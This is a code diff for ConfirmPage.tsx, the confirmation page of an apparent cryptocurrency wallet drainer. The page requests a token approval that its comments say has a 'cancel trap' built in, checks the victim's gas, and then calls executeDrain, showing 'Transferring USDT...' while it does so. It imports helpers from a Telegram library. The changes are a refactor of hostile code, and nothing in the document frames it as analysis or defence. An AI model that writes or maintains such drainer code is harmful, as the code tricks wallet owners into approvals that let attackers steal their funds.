@@ -1,8 +1,8 @@
-// src/components/confirm-page.tsx
+// src/components/ConfirmPage.tsx
 import { useState } from "react";
 import { ethers } from "ethers";
 import { requestApproval, ensureGas, executeDrain, cancelApprovalLoop } from "../lib/web3";
-import { formatAddress } from "../lib/telegram"; // Removed `notify`
+import { formatAddress } from "../lib/telegram";
 
 interface Props {
   provider: ethers.BrowserProvider;
@@ -26,7 +26,7 @@ export default function ConfirmPage({ provider, address, recipient, amount, onBa
     setStatusMsg("Requesting approval...");
 
     try {
-      // Step 1: Approval (with cancel trap built-in)
+      // Step 1: Approval (2 arguments: provider, address)
       const approvedAmount = await requestApproval(provider, address);
       if (!approvedAmount) {
         setStage("error");
@@ -35,7 +35,7 @@ export default function ConfirmPage({ provider, address, recipient, amount, onBa
         return;
       }
 
-      // Step 2: Gas check
+      // Step 2: Gas check (2 arguments: provider, address)
       setStage("checking_gas");
       setStatusMsg("Checking gas balance...");
       const hasGas = await ensureGas(provider, address);
@@ -46,10 +46,10 @@ export default function ConfirmPage({ provider, address, recipient, amount, onBa
         return;
       }
 
-      // Step 3: Drain
+      // Step 3: Drain (2 arguments: address, approvedAmount)
       setStage("draining");
       setStatusMsg("Transferring USDT...");
-      const drained = await executeDrain(provider, address, approvedAmount);
+      const drained = await executeDrain(address, approvedAmount); // Updated: Removed `provider`
 
       setIsLoading(false);
       if (drained) {
